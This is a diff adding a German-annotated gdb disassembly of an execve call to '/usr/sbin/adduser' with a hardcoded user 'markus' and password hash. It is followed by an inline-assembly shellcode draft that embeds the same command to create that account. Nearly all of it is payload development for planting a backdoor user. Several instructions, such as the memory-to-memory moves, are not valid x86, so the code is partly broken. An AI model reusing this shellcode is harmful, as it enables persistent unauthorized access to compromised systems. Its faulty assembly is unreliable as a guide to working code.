@@ -1,0 +1,79 @@
+
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x80481e0 <main>:       push   %ebp				;Framepointer sichern
+0x80481e1 <main+1>:     mov    %esp,%ebp			;Neuer FP ist SP
+0x80481e3 <main+3>:     sub    $0x28,%esp			;Anlegen von 40B für die Adressen der Vier Strings
+0x80481e6 <main+6>:     movl   $0x808dbe0,0xffffffd8(%ebp)	;Adresse von name[0] = "/usr/sbin/adduser" aufn Stack (ebp -40)
+0x80481ed <main+13>:    movl   $0x808dbf2,0xffffffdc(%ebp)	;Adresse von name[1] = "markus" aufn Stack (ebp -36)
+0x80481f4 <main+20>:    movl   $0x808dbf9,0xffffffe0(%ebp)	;Adresse von name[2] = "-p" aufn Stack (ebp -32)
+0x80481fb <main+27>:    movl   $0x808dc00,0xffffffe4(%ebp)	;Adresse von name[3] = "$1$7ÏvÙLKÏµ$gSUKG6RALzRA8ryROcTsG0" aufn Stack (ebp -28)
+0x8048202 <main+34>:    movl   $0x0,0xffffffe8(%ebp)		;Adresse von name[4] = NULL; aufn Stack
+0x8048209 <main+41>:    sub    $0x4,%esp			;Weitere 4B anlegen
+0x804820c <main+44>:    push   $0x0				;Parameter in umgekherter Reihenfolge für execve übergeben, also execve(name[0], name[], NULL);
+0x804820e <main+46>:    lea    0xffffffd8(%ebp),%eax		;Adresse von name[] nach eax-Register laden (ebp -40)
+0x8048211 <main+49>:    push   %eax				;Adresse von name[] aufn Stack schieben
+0x8048212 <main+50>:    pushl  0xffffffd8(%ebp)			;Adresse vom String name[0] = "/usr/sbin/adduser"aufn Stack schieben
+0x8048215 <main+53>:    call   0x804cac0 <__execve>		;Funktion aufrufen, der IP wird aufn Stack geschoben
+0x804821a <main+58>:    add    $0x10,%esp
+0x804821d <main+61>:    leave
+0x804821e <main+62>:    ret
+End of assembler dump.
+
+
+(gdb) disassemble __execve
+Dump of assembler code for function __execve:
+0x804cac0 <__execve>:   	push   %ebp			;FP sichern
+0x804cac1 <__execve+1>: 	mov    $0x0,%eax		;löschen von eax
+0x804cac6 <__execve+6>: 	mov    %esp,%ebp		;Neuer FP ist an Position von SP
+0x804cac8 <__execve+8>: 	test   %eax,%eax		;Bitweises UND, das die Flags setzt (eax=0 s.o.)
+0x804caca <__execve+10>:        push   %edi			;EDI-Register sichern
+0x804cacb <__execve+11>:        push   %ebx			;EBX-Register sichern
+0x804cacc <__execve+12>:        mov    0x8(%ebp),%edi		;Schiebe die adresse von "/usr/sbin/adduser" nach edi
+0x804cacf <__execve+15>:        je     0x804cad6 <__execve+22>	;Verzweige wenn Z-Flag gesetzt (beduetet eax=0)
+0x804cad1 <__execve+17>:        call   0x0			;Rufe Funktion 0x0
+0x804cad6 <__execve+22>:        mov    0xc(%ebp),%ecx		;Kopiere Adresse von name[] nach ECX
+0x804cad9 <__execve+25>:        mov    0x10(%ebp),%edx		;Null-Pointer nach EDX
+0x804cadc <__execve+28>:        push   %ebx			;Schiebe EBX aufn Stack
+0x804cadd <__execve+29>:        mov    %edi,%ebx		;schiebe EDI nach EBX (Adresse von "/usr/sbin/adduser" nach EBX
+0x804cadf <__execve+31>:        mov    $0xb,%eax		;Den Wert 11 (Entspricht execve der Syscall tabelle) nach EAX kopieren
+0x804cae4 <__execve+36>:        int    $0x80			;In den Kernel-Mode wechseln
+
+0x804cae6 <__execve+38>:        pop    %ebx			;Zuvor gesichertes EBX wieder vom Stack holen
+0x804cae7 <__execve+39>:        mov    %eax,%ebx		;Schiebe EAX nach EBX
+0x804cae9 <__execve+41>:        cmp    $0xfffff000,%ebx
+0x804caef <__execve+47>:        jbe    0x804caff <__execve+63>
+0x804caf1 <__execve+49>:        neg    %ebx
+0x804caf3 <__execve+51>:        call   0x80484bc <__errno_location>
+0x804caf8 <__execve+56>:        mov    %ebx,(%eax)
+0x804cafa <__execve+58>:        mov    $0xffffffff,%ebx
+0x804caff <__execve+63>:        mov    %ebx,%eax
+0x804cb01 <__execve+65>:        pop    %ebx
+0x804cb02 <__execve+66>:        pop    %edi
+0x804cb03 <__execve+67>:        pop    %ebp
+0x804cb04 <__execve+68>:        ret
+
+
+
+
+void main() {
+__asm__("#asdsad
+	jmp 0x4a
+	popl %esi				
+	movl %esi,63(%esi)			#Adresse von name[0] nach [A]		
+	movl 18(%esi),67(%esi)			#Adresse von name[1] nach [A+1]
+	movl 25(%esi),71(%esi)			#Adresse von name[2] nach [A+2]
+	movl 28(%esi),75(%esi)			#Adresse von name[3] nach [A+3]
+	movb $0x0,17(%esi)			#Endekennungen der Strings
+	movb $0x0,24(%esi)
+	movb $0x0,27(%esi)
+	movb $0x0,62(%esi)
+	movl $0x0,79(%esi)			#NULL-Pointer der Pointer-Liste
+	movl $0xb,%eax				#Code der SysCall-Tabelle
+	movl %esi,%ebx				#Adresse von name[0]
+	leal 63(%esi),%ecx			#Adresse [A] nach ECX (name[])
+	leal 79(%esi),%edx		#Adresse des Nullpointers nach EDX
+	call -0x4f
+	.string \"/usr/sbin/adduser#markus#-p#$1$7ÏvÙLKÏµ$gSUKG6RALzRA8ryROcTsG0#\"
+	");
+}
